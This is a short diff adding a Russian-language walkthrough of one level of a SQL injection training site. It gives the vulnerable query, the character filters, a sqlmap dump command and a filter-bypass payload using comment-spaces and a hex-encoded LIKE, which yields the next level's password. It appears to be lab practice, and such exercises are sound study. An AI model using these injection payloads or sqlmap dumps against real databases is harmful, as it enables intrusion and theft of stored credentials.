@@ -1,0 +1,27 @@
+https://sql.training.hackerdom.ru/7dsfhsdjkf.php
+------------------------------------------------
+
+
+Таблицы: users
+Поля: id, login, pass
+Запрос: SELECT * FROM users WHERE id=$text LIMIT 1
+Подсказка: удачи
+
+Теперь всегда выводится только первая строка ответа (вне зависимости от того, сколько вернул SQL-запрос)
+Фильтруются символы ', ", +, =, запятая, пробел, скобки
+
+
+sqlmap:
+sqlmap -u "https://sql.training.hackerdom.ru/7dsfhsdjkf.php?text=1" -D sql_level7 -T users --dump --batch 
+
+
+погуглив понял, "пробелы" можно ставить /**/ - это комментарии
+
+опять же закодируем в hex значение %gentoo%, именно с %% так как у нас есть только подстрока, так же LIKE используется как where
+
+
+вот запрос
+-1/**/or/**/login/**/like/**/0x2567656e746f6f25
+
+и вот ответ:
+level8please
